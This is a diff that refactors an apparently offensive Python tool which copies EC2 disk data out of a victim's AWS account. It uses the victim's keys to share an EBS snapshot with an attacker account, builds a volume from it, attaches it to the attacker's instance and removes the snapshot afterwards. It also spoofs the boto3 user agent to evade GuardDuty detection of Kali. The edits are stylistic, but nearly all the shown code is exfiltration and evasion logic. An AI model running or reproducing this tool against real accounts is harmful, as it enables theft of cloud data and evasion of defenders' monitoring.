@@ -72,44 +72,39 @@ class Logger:
 
     @staticmethod
     def out(x): 
-        Logger._out('[>] ' + x)
+        Logger._out(f'[>] {x}')
     
     @staticmethod
     def info(x):
         if config['verbose']:
-            Logger._out('[.] ' + x)
+            Logger._out(f'[.] {x}')
     
     @staticmethod
     def fatal(x): 
-        sys.stdout.write('[!] ' + x + '\n')
+        sys.stdout.write(f'[!] {x}' + '\n')
         sys.exit(1)
     
     @staticmethod
     def fail(x):
-        Logger._out('[-] ' + x)
+        Logger._out(f'[-] {x}')
     
     @staticmethod
     def ok(x):  
-        Logger._out('[+] ' + x)
+        Logger._out(f'[+] {x}')
 
 
 class ExfiltrateEC2:
     session = None
     def __init__(self, region, attacker_keys, victim_keys):
         self.region = region
-        self.keys = {
-            'attacker' : {},
-            'victim' : {},
-        }
-        self.keys['attacker'] = attacker_keys
-        self.keys['victim'] = victim_keys
+        self.keys = {'attacker': attacker_keys, 'victim': victim_keys}
         self.session = {
             'attacker' : None,
             'victim' : None,
         }
 
         Logger.info(f"Using region: {region}")
-        
+
         Logger.info("Authenticating using Attacker's AWS credentials...")
         self.session['attacker'] = self.authenticate(region, attacker_keys)
 
@@ -169,18 +164,18 @@ class ExfiltrateEC2:
         Logger.out(f"Step 2: Modifying snapshot attributes to share it with UserId = {target_user}")
         try:
             modify_result = victim_client.modify_snapshot_attribute(
-                Attribute = f'createVolumePermission',
-                OperationType = 'add',
-                SnapshotId = snapshot['SnapshotId'],
-                UserIds = [
+                Attribute='createVolumePermission',
+                OperationType='add',
+                SnapshotId=snapshot['SnapshotId'],
+                UserIds=[
                     target_user,
-                ]
+                ],
             )
             Logger.ok(f"Snapshot's attributes modified to share it with user {target_user}")
         except Exception as e:
             Logger.fatal(f"ec2:ModifySnapshotAttribute action on Victim failed. Exception: {e}")
 
-        Logger.out(f"Step 3: Waiting for the snapshot to transit into completed state.")
+        Logger.out("Step 3: Waiting for the snapshot to transit into completed state.")
         try:
             victim_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot['SnapshotId']])
         except Exception as e:
@@ -194,7 +189,7 @@ class ExfiltrateEC2:
         attacker_instance_data = None
         try:
             if not availability_zone:
-                availability_zone = self.region + 'a'
+                availability_zone = f'{self.region}a'
                 attacker_instance = attacker_client.describe_instances(
                     InstanceIds = [attacker_instance_id, ]
                 )
@@ -209,8 +204,6 @@ class ExfiltrateEC2:
             Logger.fail(f"THIS MAY BE FATAL: Could not enumerate attacker's instance with given InstanceId = {attacker_instance_id}")
             Logger.fail(f"Exception: {e}")
             raise e
-            availability_zone = self.region + 'a'
-
         try:
             volume_created = attacker_client.create_volume(
                 AvailabilityZone = availability_zone,
@@ -222,7 +215,7 @@ class ExfiltrateEC2:
         except Exception as e:
             Logger.fail(f"ec2:CreateVolume action on Attacker failed. Exception: {e}")
 
-        Logger.out(f"Step 5: Waiting for the volume to transit into created state.")
+        Logger.out("Step 5: Waiting for the volume to transit into created state.")
         try:
             attacker_client.get_waiter('volume_available').wait(VolumeIds=[volume_created['VolumeId']])
         except Exception as e:
@@ -231,7 +224,9 @@ class ExfiltrateEC2:
 
             time.sleep(3 * 60)
 
-        Logger.out(f"Step 6: Attaching created EBS volume to Attacker's specified EC2 instance")
+        Logger.out(
+            "Step 6: Attaching created EBS volume to Attacker's specified EC2 instance"
+        )
         try:
             attacker_client.attach_volume(
                 Device = '/dev/xvdf',
@@ -258,7 +253,7 @@ class ExfiltrateEC2:
                 except Exception as e:
                     Logger.fail(f"ec2:AttachVolume action on Attacker failed. Exception: {e}")
                     Logger.fail("Tried to automatically stop attacker's EC2 instance, then attach volume and restart it, but that failed as well.")
-                    Logger.fail(f"Exception: " + str(e))
+                    Logger.fail(f"Exception: {str(e)}")
 
                 Logger.info("Restarting it...")
                 attacker_instance = attacker_client.start_instances(
@@ -281,7 +276,7 @@ class ExfiltrateEC2:
         try:
             Logger.out(f"Cleanup. Trying to remove created snapshot ({snapshot['SnapshotId']}) at Victim's estate...")
             victim_client.delete_snapshot(SnapshotId = snapshot['SnapshotId'])
-            Logger.ok(f"Snapshot removed.")
+            Logger.ok("Snapshot removed.")
         except Exception as e:
             Logger.fail(f"(That's ok) ec2:DeleteSnapshot action on Victim failed. Exception: {e}")
 
@@ -469,19 +464,19 @@ def parseOptions(argv):
     config['region'] = args.region
 
     if args.method == 'createimage':
-        if args.instance_id != None:
-            config['instance-id'] = args.instance_id
-        else:
+        if args.instance_id is None:
             Logger.fatal('--instance-id parameter is required for this to work.')
 
+        else:
+            config['instance-id'] = args.instance_id
     if args.method == 'createsnapshot':
-        if args.volume_id != None and args.attach_instance_id != None: 
+        if args.volume_id is None or args.attach_instance_id is None:
+            Logger.fatal('--volume-id and --attach-instance-id parameters are required for this to work.')
+
+        else:
             config['volume-id'] = args.volume_id
             config['attach-instance-id'] = args.attach_instance_id
             config['availability-zone'] = args.availability_zone
-        else:
-            Logger.fatal('--volume-id and --attach-instance-id parameters are required for this to work.')
-
     if not args.region:
         Logger.fatal("Please provide AWS region to operate in.")
 
@@ -528,7 +523,7 @@ def monkeyPatchBotocoreUserAgent():
 
     try:
         from _pytest.monkeypatch import MonkeyPatch
-    except (ImportError, ModuleNotFoundError) as e:
+    except ImportError as e:
         print('[!] Please install "pytest" first: pip3 install pytest')
         print('\tthis will be used to patch-up boto3 library to avoid GuardDuty Kali detection')
         sys.exit(0)
@@ -536,8 +531,6 @@ def monkeyPatchBotocoreUserAgent():
     monkeypatch = MonkeyPatch()
     def my_user_agent(self):
         return "Boto3/1.9.89 Python/2.7.12 Linux/4.2.0-42-generic"
-
-        monkeypatch.setattr(botocore.session.Session, 'user_agent', my_user_agent)
 
 def main(argv):
     opts = parseOptions(argv)
